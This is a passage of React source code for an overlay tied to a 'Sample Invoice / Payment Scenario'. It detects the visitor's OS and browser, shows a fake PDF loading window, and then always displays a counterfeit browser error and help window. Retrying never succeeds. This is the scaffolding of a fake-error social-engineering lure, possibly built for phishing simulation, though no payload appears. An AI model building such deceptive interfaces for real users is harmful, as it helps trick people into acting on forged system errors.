        onMouseDown={(event) => event.stopPropagation()}
      >
        <div className="flex h-11 shrink-0 items-center gap-2 border-b border-[#e8eaed] bg-[#f8f9fa] px-3">
          <p className="min-w-0 flex-1 truncate text-[13px] font-medium text-[#202124]">
            Sample Invoice / Payment Scenario
          </p>
          <a
            href={SCENARIO_PDF_URL}
            target="_blank"
            rel="noreferrer"
            className="rounded px-2.5 py-1 text-[12px] font-medium text-[#1a73e8] hover:bg-[#e8eaed]"
          >
            Open in new tab
          </a>
          <button
            type="button"
            onClick={() => onOpenChange(false)}
            className="flex h-7 w-7 items-center justify-center rounded-full text-[16px] text-[#5f6368] hover:bg-[#e8eaed]"
            aria-label="Close"
          >
            ×
          </button>
        </div>
        <iframe
          title="Sample Invoice Payment Scenario"
          src={SCENARIO_PDF_URL}
          className="h-full w-full flex-1 bg-[#525659]"
        />
      </div>
    </div>
  );
}

/** Open Scenario → loading → browser-style error. Details → browser help window. */
export function FinanceCompatibilityIssueOverlay({
  open,
  onOpenChange,
  onErrorShown,
}: {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  onErrorShown?: () => void;
}) {
  const [clientOs, setClientOs] = useState<ClientOs>(() =>
    typeof window !== "undefined" ? detectClientOs() : "windows",
  );
  const [clientBrowser, setClientBrowser] = useState<ClientBrowser>(() =>
    typeof window !== "undefined" ? detectClientBrowser() : "chrome",
  );
  const [stage, setStage] = useState<OverlayStage>("loading");
  const onErrorShownRef = useRef(onErrorShown);
  onErrorShownRef.current = onErrorShown;

  useEffect(() => {
    setClientOs(detectClientOs());
    setClientBrowser(detectClientBrowser());
  }, []);

  useEffect(() => {
    if (!open) {
      setStage("loading");
      document.body.classList.remove("nm-system-error-active");
      return undefined;
    }

    document.body.classList.add("nm-system-error-active");
    setStage("loading");
    const timer = window.setTimeout(() => {
      setStage("error");
      onErrorShownRef.current?.();
    }, RENDER_DELAY_MS);

    return () => {
      window.clearTimeout(timer);
      document.body.classList.remove("nm-system-error-active");
    };
  }, [open]);

  function startRetry() {
    setStage("loading");
    window.setTimeout(() => {
      setStage("error");
      onErrorShownRef.current?.();
    }, RENDER_DELAY_MS);
  }

  if (!open) {
    return null;
  }

  return (
    <div
      className="fixed inset-0 flex items-center justify-center p-4"
      style={{ zIndex: 99999 }}
    >
      <button
        type="button"
        className="absolute inset-0 bg-black/25"
        aria-label="Dismiss"
        onClick={() => {
          if (stage !== "loading") {
            onOpenChange(false);
          }
        }}
      />

      <div
        className={`relative z-10 w-full ${
          stage === "loading"
            ? "max-w-3xl"
            : stage === "help"
              ? "max-w-[760px]"
              : "max-w-[640px]"
        }`}
        onClick={(event) => event.stopPropagation()}
        onMouseDown={(event) => event.stopPropagation()}
      >
        {stage === "loading" ? (
          <div className="flex justify-center">
            <PdfLoadingWindow browser={clientBrowser} />
          </div>
        ) : null}

        {stage === "error" ? (
          <div className="flex justify-center">
            <BrowserErrorDialog
              os={clientOs}
              browser={clientBrowser}
              onClose={() => onOpenChange(false)}
              onTryAgain={startRetry}
              onOpenHelp={() => setStage("help")}
            />
          </div>
        ) : null}

        {stage === "help" ? (
          <div className="flex justify-center">
            <BrowserHelpWindow
              os={clientOs}
              browser={clientBrowser}
              onReturn={() => onOpenChange(false)}
              onTryAgain={startRetry}
            />
          </div>
        ) : null}
      </div>
    </div>
  );
}
